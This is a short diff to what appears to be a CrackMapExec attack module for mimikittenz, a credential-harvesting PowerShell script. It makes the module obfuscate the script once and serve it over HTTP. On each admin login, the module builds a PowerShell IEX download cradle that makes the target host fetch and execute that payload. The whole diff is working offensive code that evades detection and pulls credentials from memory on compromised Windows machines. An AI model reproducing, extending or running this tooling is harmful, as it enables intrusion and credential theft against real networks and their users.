@@ -18,9 +18,10 @@ class CMEModule:
     def options(self, context, module_options):
         '''
         '''
+        self.ps_script = obfs_ps_script('mimikittenz/Invoke-mimikittenz.ps1')
         return
 
-    def on_admin_login(self, context, command):
+    def on_admin_login(self, context, connection):
         command = 'Invoke-mimikittenz'
         launcher = gen_ps_iex_cradle(context, 'Invoke-mimikittenz.ps1', command)
         ps_command = create_ps_command(launcher)
@@ -33,9 +34,9 @@ class CMEModule:
             request.send_response(200)
             request.end_headers()
 
-            with open(get_ps_script('mimikittenz/Invoke-mimikittenz.ps1'), 'r') as ps_script:
-                ps_script = obfs_ps_script(ps_script.read(), function_name=self.obfs_name)
-                request.wfile.write(ps_script)
+            #with open(get_ps_script('mimikittenz/Invoke-mimikittenz.ps1'), 'r') as ps_script:
+            #    ps_script = obfs_ps_script(ps_script.read(), function_name=self.obfs_name)
+            request.wfile.write(self.ps_script)
 
         else:
             request.send_response(404)
